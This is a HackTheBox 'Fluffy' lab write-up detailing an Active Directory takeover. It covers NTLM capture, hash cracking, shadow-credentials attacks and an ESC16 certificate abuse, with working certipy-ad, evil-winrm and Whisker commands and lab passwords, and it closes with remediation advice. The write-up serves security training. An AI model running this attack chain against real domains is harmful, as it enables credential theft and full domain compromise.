<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="description" content="HackTheBox Fluffy Writeup by Rachel Murphy" />
  <title>HTB: Fluffy | Rachel Murphy</title>

  <!-- Base site styling -->
  <link rel="stylesheet" href="/assets/css/writeups.css" />
  <script src="/assets/css/js/script.js" defer></script>
</head>
<body>

  <!-- Header -->
  <header>
    <h1>Fluffy Writeup</h1>
    <p>HackTheBox</p>
    <nav aria-label="Primary navigation">
      <ul>
        <li><a href="/index.html">Home</a></li>
        <li><a href="../index.html">Writeups</a></li>
        <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
        <li><a href="/tools/index.html">Tools</a></li>
        <li><a href="/about.html">About</a></li>
      </ul>
    </nav>
  </header>

  <main>
    <article class="section" aria-labelledby="release-arena">
      <h2 id="release-arena">Release Arena</h2>
      
        <img src="images/Pasted image 20250915181446.png" alt="Release Arena Screenshot" />

      <p><strong>Description</strong></p>
      <p>
        <code>Fluffy</code> is an <em>easy</em> Windows-based machine that simulates a domain environment
        with an assumed initial breach. The scenario starts from low-privileged credentials and
        progresses through enumeration, discovery of service accounts, credential harvesting, and
        abuse of Active Directory Certificate Services to obtain Administrator-level access.
      </p>

      <p><strong>Target IP:</strong> <code>10.10.11.69</code></p>

      <h3>Autorecon</h3>
      <p>
        I started by running an automated reconnaissance pass to get a baseline of open services.
        This provides a prioritized list of interesting ports and services to follow up manually.
        The autorecon output highlighted services typical of an Active Directory domain controller.
      </p>
      <pre><code>autorecon -t ip.txt -vvv --ignore-plugin-checks</code></pre>

      <h3>NMAP</h3>
      <figure>
        <img src="images/Pasted image 20250915202202.png" alt="NMAP Scan results screenshot" />
        <figcaption>Nmap scan summary showing exposed directory services and Windows RPC/SMB.</figcaption>
      </figure>
      <p>
        The scan returned many ports associated with LDAP, SMB, RPC and WinRM (for example: 53, 88,
        139, 389, 445, 464, 593, 636, 5985). The presence of these services strongly suggested a
        Domain Controller role. Hostname resolution identified the domain as
        <code>fluffy.htb</code> and the domain controller as <code>DC01.fluffy.htb</code>; I added
        the IP/hostname mapping to <code>/etc/hosts</code> to simplify subsequent tooling.
      </p>

      <h3>SMB (Port 445)</h3>
      <p>
        With initial credentials, I enumerated available SMB shares. SMB shares on domain controllers
        or file servers frequently contain sensitive configuration files, archives, or username lists
        that can be useful for privilege escalation or lateral movement.
      </p>

      <h4>Enumerate SMB shares with given credentials</h4>
      <pre><code>j.fleischman / J0elTHEM4n1990!</code></pre>
      <p>
        The provided user had read/write access to the <code>IT</code> share. Having write access
        to a network share in a domain environment is an important finding because it can be used
        to deliver files that may later be processed by other services or applications.
      </p>

      <figure>
        <img src="images/IT-share-fluffy.png" alt="NXC shares output showing IT share" />
        <figcaption>Discovery: initial user has read/write access to the IT share.</figcaption>
      </figure>

      <h4>Enumerate IT share</h4>
      <pre><code>smbclient -U 'j.fleischman' //10.10.11.69/IT</code></pre>
      <figure>
        <img src="images/access-smb-share-fluffy-smbclient.png" alt="smbclient interactive listing of IT share" />
        <figcaption>Accessing the IT share and enumerating files.</figcaption>
      </figure>
      <p>
        I downloaded the share contents to inspect documents, libraries and executables present in the
        directory. The files of interest were an upgrade notice PDF, some library files (with a
        URL-like parameter), binaries, and an archived KeePass file. Each of these warranted closer
        inspection because they can contain credentials, configuration references, or paths that can
        be abused.
      </p>

      <h4>SMB Share Files — notable items</h4>
      <figure>
        <img src="images/contents-it-share-fluffy.png" alt="IT share contents screenshot" />
        <figcaption>Snapshot of files stored on the IT share.</figcaption>
      </figure>

      <h5>KeePass archive</h5>
      <figure>
        <img src="images/Pasted image 20250915212746.png" alt="KeePass zip contents screenshot" />
        <figcaption>Contents of the KeePass zip — unprotected archive in this case.</figcaption>
      </figure>
      <p>
        The KeePass zip in this instance was unencrypted. In a production environment finding an
        unprotected password store is a critical data exposure that should be remediated immediately.
        For the purposes of a lab, it was noted and cataloged as a potential credential source.
      </p>

      <h5>Exploit library files</h5>
      <figure>
        <img src="images/Pasted image 20250918143719.png" alt="Exploit library file content screenshot" />
        <figcaption>Library file containing a URL-like parameter referencing a network share.</figcaption>
      </figure>
      <p>
        The library file contained a URL/UNC-style parameter. Files that reference external locations
        are noteworthy because, depending on how they are processed by client or server components,
        they can trigger network requests or authentication behavior that can be observed remotely.
      </p>

      <h5>Upgrade_Notice.pdf — CVE table and contact</h5>
      <figure>
        <img src="images/cves-fluffy.png" alt="Upgrade Notice vulnerabilities screenshot" />
        <figcaption>PDF excerpt listing CVEs and providing an operations contact.</figcaption>
      </figure>
      <p>
        The <code>Upgrade_Notice.pdf</code> conveniently listed a set of vulnerabilities and included
        an operations email (<code>infrastructure@fluffy.htb</code>). Rather than immediately
        jumping into exploit testing, I researched each referenced CVE to determine plausibility in
        this environment and whether it matched the software/components observed on the box.
      </p>

      <h5>Researching CVEs listed in the PDF</h5>
      <p>
        The PDF listed several CVEs. For each I performed background research (vendor advisories and
        vulnerability databases) to understand impact, preconditions, and likely exploitability in
        the target environment. Briefly:
      </p>
      <ul>
        <li>
          <strong>CVE-2025-24996</strong> — an issue related to external control of file name/path
          handling that can influence NTLM-based authentication flows. Given the library file that
          references a network resource, this CVE was an obvious candidate to investigate further.
          (reference: Rapid7 vulnerability entry).
          <figure>
            <img src="images/nlmhashdisclosure-fluffy.png" alt="CVE-2025-24996 notes screenshot" />
          </figure>
        </li>
        <li>
          <strong>CVE-2025-21193</strong> — AD Federation Server spoofing related issues. This is a
          useful reminder that identity federation components are high-risk targets, but exploitability
          depends on the presence and configuration of those services.
          <figure>
            <img src="images/Pasted image 20250915214346.png" alt="CVE-2025-21193 screenshot" />
          </figure>
        </li>
        <li>
          <strong>CVE-2025-3445</strong> — a zip-slip style path traversal that is applicable only if
          a specific archiver/utility is installed and invoked. This was noted as a possible
          post-compromise or lateral move vector rather than an initial access vector.
          <figure>
            <img src="images/Pasted image 20251002112810.png" alt="CVE-2025-3445 notes screenshot" />
          </figure>
        </li>
      </ul>

      <p>
        After assessing the CVE details and the share contents, the most plausible initial path
        appeared to be manipulating the library file to observe authentication activity (the library
        referenced a network resource, which could cause an AD client to attempt authentication).
        Before acting on that, I ran internal enumeration tooling to see if there were any other
        higher-probability attack paths.
      </p>

      <h4>BloodHound Enumeration</h4>
      <p>
        I used BloodHound to map relationships and privileges in the domain. BloodHound is useful for
        quickly identifying interesting paths such as accounts with write permissions to services,
        service accounts with elevated rights, and users that can be targeted to reach a high-value
        principal (Administrator).
      </p>
      <pre><code>python3 bloodhound.py -ns 10.10.11.69 -d fluffy.htb -dc dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' -c All</code></pre>

      <figure>
        <img src="images/initial-bloodhound-fluffy.png" alt="BloodHound initial graph screenshot" />
        <figcaption>Initial BloodHound upload and graphing of domain relationships.</figcaption>
      </figure>

      <p>
        The BloodHound graph highlighted two service accounts of interest: <code>winrm_svc</code>
        and <code>ca_svc</code>. Service accounts are often useful targets because they are typically
        used by infrastructure components and sometimes have privileged group memberships or template
        access that can be abused.
      </p>

      <figure>
        <img src="images/users-fluffy-bh.png" alt="Domain users screenshot" />
        <figcaption>Domain users — review for service accounts and privileged roles.</figcaption>
      </figure>

      <p>
        In the BloodHound results, I also observed that a directory service account (LDAP_SVC) had
        generic write permissions for groups related to WinRM and Certificate Services. This is a
        significant finding because write privileges to certain objects can enable changes that
        facilitate credential exposure or elevation.
      </p>

      <figure>
        <img src="images/Pasted image 20250918111354.png" alt="LDAP_SVC permissions screenshot" />
        <figcaption>LDAP_SVC: generic write permission example from BloodHound.</figcaption>
      </figure>

      <p>
        With that context, I considered the most likely practical next steps: attempting to capture
        credentials exposed by the library file behavior (if CVE-2025-24996 applied), and concurrently
        investigating potential certificate-based escalation via CA services (ca_svc).
      </p>

      <h4>Initial Access — high-level summary</h4>
      <p>
        The combination of a writable share containing a library file with a URL parameter and the
        presence of service accounts with potentially exploitable privileges made two parallel
        avenues attractive: (1) attempt to observe authentication attempts triggered by the library
        file and (2) gather credentials and enumerate certificate authority (CA) permissions for a
        future certificate-based escalation.
      </p>

      <h4>Responder / NTLM capture</h4>
      <p>
        To validate whether outbound/UNC-style references from the library file resulted in an
        authentication attempt, I set up responder to observe any NTLM authentication
        events coming from the target. I captured the NTLMv2 user <code>p.agila</code>.
      </p>

      <figure>
        <img src="images/Pasted image 20250918145928.png" alt="Responder captured NTLM hash screenshot" />
        <figcaption>NTLM hash captured by Responder.</figcaption>
      </figure>

      <h4>Hashcat cracking</h4>
      <p>
        The NTLMv2 hash captured from <code>p.agila</code> was cracked using <code>hashcat</code>. 
        Hashcat correctly autodetected the mode as <code>5600</code> (NTLMv2).
      </p>
      <pre><code>hashcat hash /usr/share/wordlists/rockyou.txt</code></pre>
      <p>
        The password was successfully cracked to: <code>prometheusx-303</code>.
      </p>

      <figure>
        <img src="images/Pasted image 20250918145857.png" alt="Hashcat cracking output screenshot" />
        <figcaption>Hashcat successfully cracking the captured NTLMv2 hash.</figcaption>
      </figure>

      <h4>Testing recovered credentials</h4>
      <p>
        After obtaining credentials (and verifying them against SMB/other services), I used them to
        explore access to additional resources. One important observation: some valid domain accounts
        may not have remote WinRM access enabled — account permissions and service configuration can
        limit where a credential is accepted.
      </p>

      <figure>
        <img src="images/Pasted image 20250918150302.png" alt="WinRM access test failure screenshot" />
        <figcaption>Login attempt indicating WinRM is not available for that user.</figcaption>
      </figure>

      <h4>Service account handling and group membership</h4>
      <p>
        Using the credentials I had, I explored group memberships and attempted to identify ways to
        make a target user a member of a group associated with the services I intended to use. The bloodhound
        data discovered earlier suggests that I may be able to perform a shadow credentials attack.
      </p>

      <figure>
        <img src="images/add-p-to-group-fluffy.png" alt="Add user to Service Accounts screenshot" />
        <figcaption>Adding p.agila to the Service Accounts group using RPC.</figcaption>
      </figure>

      <h4>Kerberoasting and targeted TGS requests</h4>
      <p>
        I also attempted targeted Kerberoast-style requests to obtain service ticket material for
        accounts such as <code>winrm_svc</code>. Capturing service tickets/TGS can be used offline to
        attempt to recover service account credentials. In this engagement a TGS was captured but
        cracking was unsuccessful with the provided wordlists — Kerberoast results are highly
        dependent on password complexity and available cracking resources.
      </p>

      <figure>
        <img src="images/kerberoating-winrm-hash-fluffy.png" alt="Kerberoast result screenshot" />
        <figcaption>Captured service ticket (TGS) for further offline analysis.</figcaption>
      </figure>

      <h3>Shadow Credentials Attack</h3>
      <p>
        Used certipy-ad to perform a shadow credentials attack for the winrm_svc user. 
        <code>certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account ca_svc</code>
        This attack is successful and I receive the NT hash for winrm_svc.
      </p>

      <figure>
        <img src="images/shadow-cred-attack-winrm-svc.png" alt="Certipy vulnerable check screenshot" />
        <figcaption>Captured NT hash for winrm_svc</figcaption>
      </figure>

      <h3>Interactive shell as winrm service account</h3>
      <pre><code>evil-winrm -i 10.10.11.69 -H &lt;winrm_svc-hash&gt; -u winrm_svc</code></pre>
      <figure>
        <img src="images/initial-access-fluffy.png" alt="Evil-WinRM session screenshot" />
        <figcaption>Interactive session obtained using service account credentials.</figcaption>
      </figure>

      <h3>Privilege Escalation — observations</h3>
      <p>
        Once an interactive shell was obtained for <code>winrm_svc</code>, I enumerated local
        privileges, processes, and interesting files. WinPEAS and similar enumeration tools surfaced
        a number of findings including group memberships, service-related ACLs, and artifacts
        indicating CA-related permissions for <code>ca_svc</code> I also ran SharpHound.exe and used 
        BloodHound to determine privilege escalation paths. 
      </p>

      <p>After some review of the bloodhound data, I decided to escalate my privileges from winrm_svc to ca_svc.
        The ca_svc account has CA privileges which could allow me to escalate to domain admin.
      </p>

      <img src="images/bh-showing-generic-all-over-ca-fluff.png" alt="CA_SVC path to domain controller">


      <h4>Privilege Escalation from winrm_svc user to ca_svc user</h4>
       <p>It also looks like privilege escalation from winrm_svc to ca_svc 
        could be achieved using Whisker as suggested by the BloodHound abuse suggestion.
      </p>

      <p>Since I am a member of the "Service Accounts" group, I have GenericWrite over the ca_svc user. I can use BloodHound's 
        suggested attack path with Whisker to capture the ca_svc credentials.</p>
        <img src="images/bh-route-from-winrm-to-ca-fluff.png"alt="Bloodhound path from winrm_svc to ca_svc">

        <code>.\Whisker.exe add /target:ca_svc</code>

        <p>Running Whisker results in a Rubeus code output for the ca_svc user which I can use to get a TGT for the ca_svc user.
          Pasting the Whisker output into Rubeus and executing it results in base64 encoded TGT.
        </p>
        <img src="images/rubeus-get-tgt-fluffy.png"alt="Whisker Output for Rubeus ">
        <p>Save this TGT to a file. Base64 decode it and save as a .kirbi. Use impacket-ticketconverter
          to convert the .kirbi file to .ccache. Save the .ccache as an environment variable.
        </p>

        <h3>Initial Access to CA_SVC User from WINRM_SVC User</h3>
        <p>With the ca_svc NT hash, I can rerun the vulnerable certificate checks with
           certipy-ad. The output suggests a possible ESC16 attack.
        </p>


      <h3>Certificate abuse and ESC16-style path</h3>
      <p>
        The CA in this environment allowed a sequence of actions where a service account with specific
        template rights could request a certificate for another account, and by adjusting attributes
        such as the certificate subject or UPN temporarily, authenticate as that user. In this
        engagement, leveraging CA template permissions and captured credential material enabled
        authentication as the domain Administrator.
      </p>

       <h2>Step 1: Read initial UPN of the victim account (Optional — for restoration)</h2>
      <pre><code>certipy-ad account \
    -u 'ca_svc@fluffy.htb' -k \
    -dc-ip '10.10.11.69' -user 'ca_svc' -target 'DC01.FLUFFY.HTB'\
    read</code></pre>

      <figure>
        <img src="images/Pasted image 20250920154116.png" alt="Certipy read account screenshot" />
        <figcaption>
          UPN: <code>ca_svc@fluffy.htb</code> <br/>
          SPN: <code>ADCS/ca.fluffy.htb</code>
        </figcaption>
      </figure>

      <h2>Step 2: Update the victim account's UPN to the target administrator’s <code>sAMAccountName</code></h2>
      <pre><code>certipy-ad account \
    -u 'ca_svc@fluffy.htb' -k \
    -dc-ip '10.10.11.69' -upn 'administrator' \
    -user 'ca_svc' -target 'DC01.FLUFFY.HTB' update</code></pre>

      <figure>
        <img src="images/Pasted image 20250920154640.png" alt="UPN update screenshot" />
        <figcaption>
          Note: UPN for <code>administrator</code> must be lowercase or it will fail.
        </figcaption>
      </figure>

      <p>Not sure if a new TGT is needed at this point (TBD).</p>
      <pre><code>certipy-ad shadow \
    -u 'ca_svc@fluffy.htb' -k \
    -dc-ip '10.10.11.69' -account 'ca_svc' -target 'DC01.FLUFFY.HTB' \
    auto</code></pre>

      <h2>Step 3: Request a certificate as the "victim" user</h2>
      <p>
        Use any suitable client authentication template (e.g., <code>User</code>) against the ESC16-vulnerable CA.  
        Because ESC16 omits the SID extension, the certificate will be valid for escalation.
      </p>
      <pre><code>certipy-ad req \
    -k -dc-ip '10.10.11.69' \
    -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' \
    -template 'User'</code></pre>

      <figure>
        <img src="images/Pasted image 20250920155111.png" alt="Certificate request success screenshot" />
        <figcaption>
          🎉 Success — received <code>administrator.pfx</code>.
        </figcaption>
      </figure>

      <h2>Step 4: Revert the "victim" account’s UPN</h2>
      <p><strong>Important:</strong> Do not skip this step, or authentication will fail.</p>
      <pre><code>certipy-ad account \
    -u 'ca_svc' -k \
    -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -upn 'ca_svc@fluffy.htb' \
    -user 'ca_svc' update</code></pre>

      <figure>
        <img src="images/restore-upn-fluffy.png" alt="UPN revert screenshot" />
      </figure>

      <h2>Step 5: Authenticate as the target administrator</h2>
      <pre><code>certipy-ad auth \
    -dc-ip '10.10.11.69' -pfx administrator.pfx \
    -username 'administrator' -domain 'fluffy.htb'</code></pre>


      <h2>Remediation Recommendations</h2>
      <p>
        The findings in this assessment are common patterns that lead to privilege escalation in
        Windows/AD environments. Below are prioritized recommendations to reduce attack surface and
        mitigate the classes of abuse observed:
      </p>
      <ul>
        <li><strong>Enforce strong, unique passwords</strong> for all service accounts and enable
            credential monitoring and rotation. Service account passwords should be managed and
            rotated by a privileged credential store.</li>
        <li><strong>Restrict LDAP/WinRM write permissions</strong> — limit which users can modify
            service-related objects, group membership, and servicePrincipalName attributes. Review
            changes via logging and alerts.</li>
        <li><strong>Harden Certificate Services</strong> — review template permissions, restrict who
            can enroll and which attributes can be modified during enrollment. Enforce approval
            workflows for high-risk templates.</li>
        <li><strong>Monitor authentication and certificate events</strong> — alert on abnormal
            certificate requests, unexpected subject/UPN changes, or unusual high-volume TGS/TGT
            requests.</li>
        <li><strong>Implement Kerberos and NTLM auditing</strong> — collect and analyze TGS/TGT and
            NTLM authentication events to detect suspicious patterns.</li>
        <li><strong>Apply least privilege</strong> to all service and administrative groups and
            remove unused service accounts. Regularly review group membership and ACLs.</li>
        <li><strong>Protect sensitive shares</strong> — remove unencrypted password stores from
            network shares, enforce access controls, and use DLP to detect exposed credentials.</li>
      </ul>

      <p>
        These mitigations reduce the likelihood that an initial compromise or misconfiguration can be
        escalated into full domain compromise. Many of the issues observed were the result of overly
        permissive ACLs combined with opportunistic file placements on shared resources.
      </p>
    </article>
  </main>

  <!-- Footer -->
  <footer>
    <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener noreferrer">GitHub</a></p>
    <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="../../index.html">Home</a></p>
  </footer>

</body>
</html>
